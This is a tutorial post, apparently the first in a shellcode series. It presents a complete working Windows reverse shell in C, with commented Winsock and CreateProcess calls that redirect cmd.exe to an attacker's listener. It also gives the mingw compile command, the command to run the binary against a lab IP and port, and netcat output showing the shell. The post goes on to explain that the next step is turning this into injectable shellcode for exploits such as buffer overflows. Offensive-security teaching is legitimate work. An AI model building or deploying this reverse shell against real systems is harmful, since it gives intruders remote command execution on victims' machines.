## Writing Custom Shellcode, Introduction

# Assumptions

It is assumed that you know what a reverse shell is and you have a basic ability to read the flow of code. It is not necessary to understand the Win32 API calling conventions, or assembly language - this will be explained in later articles.

## Anatomy of a Reverse Shell

Let's begin by looking at a basic reverse shell coded in C.

```c
include <winsock2.h>
#pragma comment(lib, "w2_32")

int main(int argc, char *argv[])
{
  // exit if args aren't provided (local ip/port)
  if(argc < 3) exit(0);

  // A pointer to the WSADATA data structure that is to receive details of the Windows Sockets implementation.
  WSADATA wsaData;
  	
  // If no error occurs, WSASocket returns a descriptor referencing the new socket.
  SOCKET Winsock;
  	
  // structure that specifies the address to which to connect.
  struct sockaddr_in laddr;

  // https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
  // The WSAStartup function initiates use of the Winsock DLL by a process, here we use v2.2
  WSAStartup(MAKEWORD(2,2), &wsaData);
  	
  // https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
  // The WSASocket function creates a socket that is bound to a specific transport-service provider.
  Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  // https://learn.microsoft.com/en-us/windows/win32/winsock/sockaddr-2
  // set up a socket addr structure for the local host (attacking machine)
  laddr.sin_family = AF_INET;
  laddr.sin_addr.s_addr = inet_addr(argv[1]);
  laddr.sin_port = htons(atoi(argv[2]));

  // https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
  // The WSAConnect function establishes a connection to another socket application (e.g., the netcat listener)
  WSAConnect(Winsock,(SOCKADDR*)&laddr, sizeof(laddr), NULL, NULL, NULL, NULL);
  
  if (WSAGetLastError() == 0) {
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    // Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
    STARTUPINFO ini_processo;
    
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // Contains information about a newly created process and its primary thread.
    PROCESS_INFORMATION processo_info;
      
    // https://www.tutorialspoint.com/c_standard_library/c_function_memset.htm
    // this function basically sets the ini_processo structure to all 0s
    memset(&ini_processo, 0, sizeof(ini_processo));
      
    // simply specifies the size of the structure
    ini_processo.cb=sizeof(ini_processo);
    // If this flag is specified when calling one of the process creation functions, the handles must be inheritable
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    
    // here we redirect the stdin, stdout, and stderr handles to the socket handle
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    // Creates a new process and its primary thread. The new process runs in the security context of the calling process.
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    // exit
    exit(0);
  } else {
    // exit
    exit(0);
  }
}
```

From a high level the code does four things by using the Win32 APIs:

- `WSAStartup` - Initialises the winsock DLL for use.
- `WSASocket` - Creates a socket object which we can use to connect to a `netcat` listener on an attacking machine.
- `WSAConnect` - Establishes a connection to our `netcat` listener.
- `CreateProcess` - Creates a new `cmd.exe` process and redirects the stdin, stdout, and stderr streams to the winsock object.

The C code can be compiled on a Linux machine using `mingw32`:

```bash
i686-w64-mingw32-g++ -std=c++11 shell.c -o shell.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

We can then run the portable executable on Windows:

```powershell
shell.exe 172.16.245.129 4444
```

This establishes a reverse shell back to the `netcat` listener:

```bash
nc -nvlp 4444 
listening on [any] 4444 ...
connect to [172.16.245.129] from (UNKNOWN) [172.16.245.128] 57270
Microsoft Windows [Version 10.0.19044.1766]
(c) Microsoft Corporation. All rights reserved.

C:\Users\John\Desktop>
```

This is ok, but it has a few problems. It is compiled as a PE (portable executable) file, this means it needs to be dropped to disk and executed, which is not desirable. It cannot be used in a remote exploit, such as a buffer overflow. For this we need shellcode that can be injected into an existing process and does not rely upon the structure of a PE file to execute.

When writing shellcode we need to carry out the same four tasks to establish a reverse shell, but we need to program it in assembly language, which presents us with a different set of problems.
